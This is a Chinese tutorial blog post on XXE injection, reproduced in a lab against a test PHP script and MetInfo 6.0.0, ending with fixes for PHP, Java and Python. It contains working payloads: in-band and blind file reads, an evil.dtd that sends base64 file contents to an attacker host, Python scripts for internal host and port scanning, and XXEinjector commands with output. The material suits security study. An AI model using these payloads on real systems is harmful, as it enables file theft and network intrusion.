---
title: 【漏洞笔记】深入浅出学习复现XXE
date: 2019-12-09 19:29:03
id: 191209-192903
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe6.png
tags:
- XXE
- 漏洞笔记
- 学习笔记
categories:
- 学习笔记
---

声明：文中所使用的环境均为内网环境，本文仅用于学习交流目的，严禁将本文中的技术用于违法犯罪目的。

# 0x00 关于XXE

## 0、XML是什么

XXE（XML External Entity Injection）全称为 XML 外部实体注入，XXE的第二个字母 "X" 取自单词 "External" 的第二个字母，很好奇为什么不叫XEE（手动狗头）

话不多说，让我们进入今天的正题，对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。

>XML（Extensible Markup Language）英文直译就是可扩展标记语言，“标记” 是指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。

如果把 HTML 和 XML 进行对比的话， HTML 旨在显示数据信息，而 XML 旨在传输数据信息。

XML 也可以理解为一种写法类似于 HTML 语言的数据格式文档，但是 XML 与 HTML 是为不同目的而设计的。

>如果感觉听不懂的话也没关系，先有个印象。

## 1、XML的语言格式规范

基本上每个语言都有自己的格式规范， XML 当然也不例外， XML 的格式规范是由一个叫做 DTD（Document Type Definition） 的东西控制的。

这个 DTD 的作用就是去定义 XML 文档的合法构建模块，也就是说声明了 XML 的内容格式规范。

DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 .dtd 文件。

下面是一个内部 DTD 的 XML 示例：

```
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>
<!--DTD，文档类型声明-->
<!DOCTYPE note [  #定义此文档是note类型
<!ELEMENT note (body)>  #定义note元素有一个元素："body"
<!ELEMENT body (#PCDATA)>  #定义body元素为"#PCDATA"类型
<!ENTITY writer "hello word">  #定义一个内部实体
]>
<!--文档元素-->                                                                         
<note>
<body>&writer</body>
</note>
```

上面第 7 行中定义了一个内部实体，在第 11 行中对上面定义的 writer 实体进行了引用，到时候输出的时候 &writer 就会被 "hello word" 替换，通过上面的例子，我们可以简单的理解成一个实体其实就是一个变量。

值得注意的是实体类型分为两种：内部实体和外部实体，上面是内部实体的例子，而今天的重点是外部实体，下面就来看看一个外部实体的例子。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >  #定义元素为ANY，即可以接受任何元素。
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<root>
  <body>&xxe</body>  #定义一个外部实体
</root>
```

通过第 4 行的定义， 第 7 行的 &xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。

虽然这样做是方便了，但很多时候安全与方便总是矛与盾的关系。

另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：

```
<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
```

这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。

实体总共有四种，分别是：

1、内置实体 (Built-in entities)

2、字符实体 (Character entities)

3、通用实体 (General entities)

4、参数实体 (Parameter entities)

其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。

> 估计不少人看到这里会感觉有点绕，但没关系，因为这不会影响你对下面内容的理解与复现，感兴趣的可以把上面的内容反复看几遍，或者看看文章尾部的参考文章。

通用实体我们上面已经举了不少例子，下面就来看看参数实体：

```
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

在上面的代码示例中，可以看到实体名前多了一个 "%" ，在参数实体中使用 "% 实体名" (这里面的空格不能少) 定义，并且只能在 DTD 中使用 "% 实体名" 引用。

另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体，还需要知道的是参数实体在 Blind XXE 中起到了至关重要的作用。

## 2、XML注入

接下来我们来简单的了解一下XML注入，这部分很容易就能理解。

在下面是一个普通的XML注入示例：

```
#注入前XML代码
<?xml version="1.0" encoding="UTF-8">
<USER role="admin">用户输入位置</USER>
```

当用户输入一些恶意代码，比如`User1</USER><USER role="admin">User2`，原XML代码就变成了下面的样子：

```
#注入后XML代码
<?xml version="1.0" encoding="UTF-8">
<USER role="admin">User1</USER>
<USER role="admin">User2</USER>
```

可以看到通过XML语句的前后拼接， XML代码被插入了进去。

对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，这个时候XXE就出现了！

注意，重点来了（敲黑板）

# 0x01 XXE的利用

## 0、复现环境

a、目标靶机

IP：192.168.38.132

环境：Win7 + phpstudy + apache + php

b、本地主机

IP：192.168.10.30

环境：Win10 +  phpstudy + apache + BurpSuite + Python3

>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。

## 1、有回显读本地敏感文件 (Normal XXE)

### xxe_test.php（在靶机）

```
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?>
```

在C盘下新建一个flag.txt，内容我设置成了 "XXE Payload Executed Successfully!!!"。

### payload（在本地）

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/flag.txt"> ]> 
<creds>&goodies;</creds>
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe1.png)

因为flag.txt文件中没有特殊符号，比如 & < > ” ’ ，所以获取文件内容很顺利，如果把文件内容加点特殊符号，比如下面这个样子，在原来基础上加上左右尖括号：

```
<XXE Payload Executed Successfully!!!>
```

此时再访问就是这个样子：

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe2.png)

可以看到当被读取文件中含有特殊符号时，不但没有预期想要的结果，还返回了一堆错误，这个时候就需要使用CDATA了，下面是引用WIKI中关于CDATA的介绍。

>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。
>在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。例如"<" 与 "&" 分别表示 "&lt;" 与 "&amp;"。

其实简单一点的来说也就是说，将脚本代码定义为 "CDATA" 后，CDATA 部分中的内容就会被解析器忽略，这个时候就可以读取文件了，那么接下来把Payload修改修改。

### CDATA Payload（在本地）

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///c:/flag.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://192.168.10.30/evil.dtd">  #本地IP
%dtd; ]> 

<roottag>&all;</roottag>
```

### evil.dtd（在本地）

```
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe3.png)

利用带有CDATA的Payload，可以看到特殊符号被成功绕过。

不过在正常环境中，服务器上的XML就不是用来输出的，XML文件一般都是用于配置或者在一些极端条件下才能刚好实例化解析XML的类，因此在现实环境中利用这个漏洞就需要找到不依靠回显的方法。

## 2、无回显读取本地敏感文件 (Blind XXE)

### xxe_test.php（在靶机）

```
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

### evil.dtd（在本地）

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.10.30:9999?p=%file;'>">  #本地IP
```

### Payload（在本地）

```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://192.168.10.30/evil.dtd">  #本地IP
%remote;%int;%send;
]>
```

在evil.dtd中表示把返回数据传到本地的9999端口中，因此用nc监听9999端口就能看到靶机返回的数据，下图中红框标注的数据用base64解码便是靶机上 "c:/flag.txt" 的内容。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe4.png)

至于为什么返回数据是base64编码，也是为了不破环原来的XML语法，如果不编码则会报错。

关于这个 Blind XXE 利用方式的更多脑洞可以参阅文章底部的参考文章。

## 3、HTTP内网主机探测

话不多说，直接Show me the code，下面代码是我在前人的基础上做了一些修改，运行时注意代码为Python3代码。

### Payload（在本地）

```
import requests
import base64

def XXE(ip,string):
	try:
		xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
		xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
		xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
		xml = xml + "\r\n" + """<xml>"""
		xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
		xml = xml + "\r\n" + """</xml>"""
		x = requests.post('http://192.168.38.132/xxe_test.php', data=xml, headers=headers, timeout=5).text	#记得修改靶机地址
		coded_string = x.split(' ')[-2]
		print(' [+]',ip,'Successfully Found !!!')
	except:	
		print(' [-]',ip,'Error')
		pass

if __name__ == '__main__':
	headers = {'Content-Type':'application/xml'}
	for i in range(1,255):
		ip = '192.168.38.' + str(i) 	#记得修改IP段
		string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
		XXE(ip,string)
```

讲道理，代码运行着还是挺慢的，当时想着用多线程，但是发现用多线程速度相差也不大，所以多线程的代码就不放了，感兴趣的读者可以自己尝试着对代码进行优化，如果遇到什么问题也可以在我的公众号 “TeamsSix” 进行留言。

另外如果读者想要复现的话，记得修改代码中的IP，靶机上的 xee_test.php 和之前Normal XXE利用的内容一致即可。

上面的Payload运行起来就是这个样子：

```
 ~# python3 inhostscan.py
 [+] 192.168.38.1 Successfully Found !!!
 [+] 192.168.38.2 Successfully Found !!!
 [-] 192.168.38.3 Error
 [-] 192.168.38.4 Error
……内容太多，此处省略……
 [-] 192.168.38.128 Error
 [+] 192.168.38.129 Successfully Found !!!
 [-] 192.168.38.130 Error
 [-] 192.168.38.131 Error
 [+] 192.168.38.132 Successfully Found !!!
 [-] 192.168.38.133 Error
 [-] 192.168.38.134 Error
……内容太多，此处省略……
```

如果运行代码的时候报错提示没有安装模块，直接根据报错提示安装对应模块即可。

## 4、HTTP内网主机端口扫描

找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，对于端口是否开放可以根据响应时间判断，下面放出Payload。

### Payload

```
import requests
import base64

def XXE(port):
	xml = """<?xml version="1.0" encoding="utf-8"?> """
	xml = xml + "\r\n" + """<!DOCTYPE data SYSTEM "http://192.168.38.129:""" + str(port) + """/" ["""
	xml = xml + "\r\n" + """<!ELEMENT data (#PCDATA)> """
	xml = xml + "\r\n" + """]>"""
	xml = xml + "\r\n" + """<data>7</data>"""
	r = requests.post('http://192.168.38.132/xxe_test.php', data=xml,timeout=5)	#记得修改靶机地址
	print(port,r.elapsed.total_seconds())

if __name__ == '__main__':
	for i in range(1,65535):
		XXE(i)
```

Payload运行起来就是这个样子：

```
~# python portscan.py
1 1.014703
2 1.01378
……内容太多，此处省略……
21 1.039337
22 0.020895
23 1.022882
……内容太多，此处省略……
110 1.033751
111 0.008634
112 1.038774
……内容太多，此处省略……
```

可以很明显的发现 22 端口和 111 端口的响应时间远小于其他端口，根据此特征便可以判断 22、110 端口是开启的，不过也可以用Burp对端口进行爆破，Payload如下：

```
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://192.168.38.129:22/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>7</data>
```

只需要把上面的Payload以端口进行遍历即可，但我没有找到Burp爆破结果以响应时间排序的方法，所以我还是选择用Python。

# 0x02 XXE实例（MetInfo6.0.0 CMS）

## 0、复现环境

a、目标靶机

IP：192.168.38.132

环境：Win7 + phpstudy + apache + php

b、本地主机

IP：192.168.5.9、192.168.38.129

环境：Win10 +  Kali + phpstudy + apache + BurpSuite + Python3 + Ruby

>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。

## 1、本地搭建 

靶场下载地址：

```
https://www.metinfo.cn/upload/file/MetInfo6.0.0.zip
```

下载解压，取消文件夹只读权限，把解压文件放到WWW目录下。
接下来访问靶机的IP地址，跟着CMS的提示一步一步走，很容易就能搭建成功，如果是Linux环境，建议使用宝塔安装，比较方便。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe5.png)

## 2、XXE测试

直接上工具 XXEinjector，工具地址：

```
https://github.com/enjoiz/XXEinjector
```

这里的工具使用命令：

```
./XXEinjector.rb --host=192.168.38.129 --file=metlnfo_req.txt --path=C:/flag.txt --verbose --httpport=999 --oob=http --phpfilter
```

这里解释一下各个参数的意思

```
--host 指定本地IP地址，即反向连接地址，注意不是靶机地址
--file 指定发送目标的请求包，这里我的请求包内容放在了下面
--path 指定指定要遍历的目录或文件，如果想遍历目录则需要目标是java环境，如果是单一文件，则哪种环境都行
--verbose 显示详细信息，可以显示攻击数据包等，推荐使用
--httpport 指定本地监听端口，默认80，这个也就是指定本地IP地址的端口
--oob out of band方式提供ftp(默认)、http、gopher三种协议，在我自己的本地测试发现只有使用http方协议才能正常返回数据
--phpfilter 使用PHP filter对检索文件进行Base64编码，这个参数不加上可能数据无法返回
```

我这里 --file 参数指定发送目标的请求包如下，如果笔者想要复现则需要修改IP成自己的，另外需要注意，请求包中的 "XXEINJECT" 为工具的标记注入点

```
POST /member/index.php?a=donotify&m=web&c=pay&n=pay HTTP/1.1
Host: 192.168.38.132  #目标IP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip,deflate
Content-Type: text/xml
Referer: http://192.168.38.132/  #目标IP
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 25

XXEINJECT
<data>4</data>
```

值得注意的是XXEinjector需要Ruby语言支持，因为Kali自带Ruby语言环境，这里我就直接用Kali了，接下来就让我们愉快的使用工具吧。

```
root@kali:~# ./XXEinjector.rb --host=192.168.38.129 --file=metlnfo_req.txt --path=C:/flag.txt --verbose --httpport=999 --oob=http --phpfilter
XXEinjector by Jakub Pałaczyński

Enumeration options:
"y" - enumerate currect file (default)
"n" - skip currect file
"a" - enumerate all files in currect directory
"s" - skip all files in currect directory
"q" - quit

[+] Sending request with malicious XML:
http://192.168.38.132:80/member/index.php?a=donotify&m=web&c=pay&n=pay
{"User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept"=>"application/json, text/javascript, */*; q=0.01", "A8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding"=>"gzip,deflate", "Content-Type"=>"text/xml", "Referer"=>"http://192.168.38.132/", "X-Requested-W"1", "Connection"=>"close", "Pragma"=>"no-cache", "Cache-Control"=>"no-cache", "Content-Length"=>"119"}

<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://192.168.38.129:999/file.dtd">%remote;%int;%trick;]>
<data>4</data>

[+] Got request for XML:
GET /file.dtd HTTP/1.0

[+] Responding with XML for: C:/flag.txt
[+] XML payload sent:
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/flag.txt">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://192.168.38.129:999/?p=%payl;'>">

[+] Response with file/directory content received:
GET /?p=WFhFIFBheWxvYWQgRXhlY3V0ZWQgU3VjY2Vzc2Z1bGx5ISEh HTTP/1.0

[+] Retrieved data:
[+] Nothing else to do. Exiting.
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe6.png)

可以看到工具已经将C:/flag.txt文件内容以base64编码的形式返回回来了，此时在工具的目录下会生成一个目录，里面保存着刚才读取文件的明文数据

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe7.png)

XXEinjector 的功能远不止读个文件这么简单，还有其他更高级的功能，比如枚举目标端口、获取目标hash等等，在本文中关于 XXEinjector 就介绍到这里

不过既然 XXEinjector 可以很方便的利用这个漏洞，那在这里使用Burp可不可以呢？

我们先把 XXEinjector 所利用的Payload复制到Burp中，并把IP修改成自己的本地IP

```
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://192.168.5.9/evil.dtd">%remote;%int;%trick;]>  #本地IP
<data>4</data>
```

在本地www目录下写入evil.dtd文件，并开启本地的Web服务，这几步和本文前半部分的Blind XEE的套路都是一样的。

```
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/flag.txt">  #要读取的文件
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://192.168.5.9/?p=%payl;'>">  #本地IP
```

使用Burp发送数据包，但是靶机只是显示了200，并没有返回什么数据

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe8.png)

这个时候打开本地的日志看看，注意是本地的日志，不是靶机，我的日志目录在Apache2.4.39\logs下，打开之后同样可以看到C:/flag.txt文件以base64编码的内容的

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe9.png)

如果不想在日志中查看返回数据，修改evil.dtd中的本地IP端口与nc监听端口一致后，同样可以看到返回数据。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/xxe10.png)

虽然说使用 XXEinjector 还是 Burp 都是可以成功复现，不过很明显使用 XXEinjector 更为方便。

# 0x03 修复建议

## 1、过滤用户提交的XML数据

```
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC
```

## 2、PHP下

```
libxml_disable_entity_loader(true);
```

## 3、JAVA下

```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

## 4、Python下

```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

# 0x04 参考文章

>https://xz.aliyun.com/t/3357
>https://zh.wikipedia.org/wiki/XML
>https://zh.wikipedia.org/zh-cn/CDATA
>https://forum.90sec.com/t/topic/239/2
>https://cloud.tencent.com/developer/article/1196122
>https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/
>更多信息欢迎关注我的个人微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
